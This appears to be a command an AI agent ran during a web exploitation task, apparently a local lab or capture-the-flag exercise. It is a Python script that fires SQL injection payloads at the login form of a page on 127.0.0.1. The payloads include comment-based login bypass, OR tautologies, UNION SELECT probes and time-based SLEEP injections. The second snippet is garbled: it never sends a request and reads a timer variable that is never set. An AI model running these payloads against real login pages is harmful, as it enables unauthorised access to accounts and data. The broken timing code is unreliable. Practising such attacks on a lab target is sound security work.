input.command:
python - <<'PY'
import urllib.parse, urllib.request
base='http://127.0.0.1:32805/index.php'
payloads=[
    "admin' -- -",
    "admin'#",
    "' OR username='admin' -- -",
    "admin' OR '1'='1' -- -",
    "' UNION SELECT 'admin' -- -",
    "' UNION SELECT 'admin','x' -- -",
    "' UNION SELECT 1,'admin' -- -",
    "' UNION SELECT 'admin','x','x' -- -",
    "' UNION SELECT 1,'admin',3 -- -",
]
for username in payloads:
    url=base+'?'+urllib.parse.urlencode({'username':username,'password':'x'})
    try:
        with urllib.request.urlopen(url, timeout=10) as r:
            body=r.read().decode('utf-8','replace')
            tail=body[body.find('<center>'):] if '<center>' in body else body[-500:]
            print(repr(username), r.status, len(body), repr(tail))
    except Exception as e:
        print(repr(username), type(e).__name__, str(e))
PY

import urllib.parse,urllib.request,time
base='http://127.0.0.1:32805/index.php'
for field,payload in [('username',"admin' OR SLEEP(3) -- -"),('password',"x' OR SLEEP(3) -- -")]:
    values={'username':'x','password':'x'}; values[field]=payload

    print(field,round(time.monotonic()-start,2))
